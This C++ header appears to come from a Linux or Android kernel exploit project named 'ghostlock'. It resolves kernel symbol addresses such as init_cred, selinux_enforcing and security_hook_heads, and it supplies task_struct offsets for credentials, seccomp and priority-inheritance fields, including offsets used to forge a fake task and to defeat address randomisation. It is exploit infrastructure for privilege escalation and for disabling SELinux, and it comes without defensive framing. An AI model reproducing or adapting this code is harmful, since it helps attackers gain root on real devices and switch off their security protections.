#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "profile.h"
#include "session/exploit_session.hpp"

namespace ghostlock::profile {

/* Value from the loaded profile, falling back to the compile-time default. */
inline uint32_t symbol_or_default(uint32_t value, uint32_t fallback) {
    return g_exploit_session.profile.or_default(value, fallback);
}

template <typename T>
inline uint32_t symbol_u32(T kernel_offsets::*field, uint32_t fallback) {
    const kernel_offsets *values = g_exploit_session.profile.values();
    return symbol_or_default(values ? static_cast<uint32_t>(values->*field) : 0,
                             fallback);
}

template <typename T>
inline uint64_t symbol_image(T kernel_offsets::*field, uint64_t fallback) {
    return KIMAGE_TEXT_BASE +
           static_cast<uint64_t>(symbol_u32(field, static_cast<uint32_t>(fallback)));
}

inline uintptr_t init_task() {
    return symbol_image(&kernel_offsets::off_init_task, INIT_TASK_OFF);
}
inline uintptr_t init_cred() {
    return symbol_image(&kernel_offsets::off_init_cred, INIT_CRED_OFF);
}
inline uintptr_t empty_zero_page() {
    return symbol_image(&kernel_offsets::off_empty_zero_page, 0);
}
inline uintptr_t root_task_group() {
    return symbol_image(&kernel_offsets::off_root_task_group, ROOT_TASK_GROUP_OFF);
}
inline uintptr_t selinux_enforcing() {
    return symbol_image(&kernel_offsets::off_selinux_enforcing, SELINUX_ENFORCING_OFF);
}
inline uintptr_t selinux_blob_sizes() {
    return symbol_image(&kernel_offsets::off_selinux_blob_sizes, SELINUX_BLOB_SIZES_OFF);
}
inline uintptr_t security_hook_heads() {
    return symbol_image(&kernel_offsets::off_security_hook_heads, SECURITY_HOOK_HEADS_OFF);
}

inline uintptr_t slide_nfulnl_logger_image() {
    return symbol_image(&kernel_offsets::off_slide_nfulnl_logger, SLIDE_NFULNL_LOGGER_OFF);
}
inline uintptr_t slide_loggers_0_1_image() {
    return symbol_image(&kernel_offsets::off_slide_loggers_0_1, SLIDE_LOGGERS_0_1_OFF);
}
inline uintptr_t slide_random_boot_id_data_image() {
    return symbol_image(&kernel_offsets::off_slide_boot_id, SLIDE_RANDOM_BOOT_ID_DATA_OFF);
}
inline uintptr_t slide_init_task_image() {
    return symbol_image(&kernel_offsets::off_init_task, INIT_TASK_OFF);
}
inline uintptr_t slide_root_task_group_image() {
    return symbol_image(&kernel_offsets::off_root_task_group, ROOT_TASK_GROUP_OFF);
}
inline uintptr_t slide_sysctl_bootid_image() {
    return symbol_image(&kernel_offsets::off_slide_boot_id, SLIDE_SYSCTL_BOOTID_OFF);
}

inline uint32_t fake_task_prio_off() {
    return symbol_u32(&kernel_offsets::task_prio, 0x94);
}
inline uint32_t fake_task_normal_prio_off() {
    return symbol_u32(&kernel_offsets::task_normal_prio, 0x9C);
}
inline uint32_t fake_task_task_group_off() {
    return symbol_u32(&kernel_offsets::task_sched_task_group, 0x420);
}
inline uint32_t fake_task_pi_lock_off() {
    return symbol_u32(&kernel_offsets::task_pi_lock, 0x9EC);
}
inline uint32_t fake_task_pi_waiters_off() {
    return symbol_u32(&kernel_offsets::task_pi_waiters, 0xA00);
}
inline uint32_t fake_task_pi_top_task_off() {
    return symbol_u32(&kernel_offsets::task_pi_top_task, 0xA10);
}
inline uint32_t fake_task_pi_blocked_on_off() {
    return symbol_u32(&kernel_offsets::task_pi_blocked_on, 0xA18);
}
inline uint32_t task_pid_off() {
    return symbol_u32(&kernel_offsets::task_pid, 0x708);
}
inline uint32_t task_tgid_off() {
    return symbol_u32(&kernel_offsets::task_tgid, 0x70C);
}
inline uint32_t task_atomic_flags_off() {
    return symbol_u32(&kernel_offsets::task_atomic_flags, 0x6C8);
}
inline uint32_t task_real_cred_off() {
    return symbol_u32(&kernel_offsets::task_real_cred, 0x8F8);
}
inline uint32_t task_cred_off() {
    return symbol_u32(&kernel_offsets::task_cred, 0x900);
}
inline uint32_t task_comm_off() {
    return symbol_u32(&kernel_offsets::task_comm, 0x910);
}
inline uint32_t task_tasks_off() {
    return symbol_u32(&kernel_offsets::task_tasks, 0x638);
}
inline uint32_t task_seccomp_off() {
    return symbol_u32(&kernel_offsets::task_seccomp, 0x9C8);
}

} // namespace ghostlock::profile

#endif
